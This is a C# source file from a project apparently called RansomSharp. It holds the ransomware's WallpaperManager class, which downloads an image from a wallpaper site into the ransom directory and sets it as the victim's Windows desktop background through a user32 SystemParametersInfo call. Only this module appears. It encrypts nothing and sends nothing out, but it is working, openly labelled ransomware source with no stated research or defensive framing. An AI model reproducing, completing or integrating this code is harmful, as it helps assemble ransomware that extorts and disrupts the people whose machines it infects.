using System.Runtime.InteropServices;

namespace RansomSharp.Core
{
    public class WallpaperManager
    {
        public async Task SetWallpaper(string ransomDir)
        {
            const string wallpaperPath = "wallpaper.jpg";
            string wallpaperFullPath = Path.Combine(ransomDir, wallpaperPath);
            const string ransomwareWallpaperUrl = "https://wallpapercave.com/wp/wp2474900.jpg";
            try
            {
                await DownloadWallpaper(ransomwareWallpaperUrl, wallpaperFullPath);
                SetWallpaperInternal(wallpaperFullPath);
            }
            catch (Exception ex)
            {
                System.Console.WriteLine($"Error occurred while setting wallpaper: {ex.Message}");
            }
        }

        private async Task DownloadWallpaper(string wallpaperUrl, string wallpaperPath)
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(wallpaperUrl);
                response.EnsureSuccessStatusCode();

                using (Stream contentStream = await response.Content.ReadAsStreamAsync())
                {
                    using (FileStream fileStream = new FileStream(wallpaperPath, FileMode.Create))
                    {
                        await contentStream.CopyToAsync(fileStream);
                    }
                }
            }
        }

        private void SetWallpaperInternal(string wallpaperPath)
        {
            const int SPI_SETDESKWALLPAPER = 0x0014;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDCHANGE = 0x02;

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
}
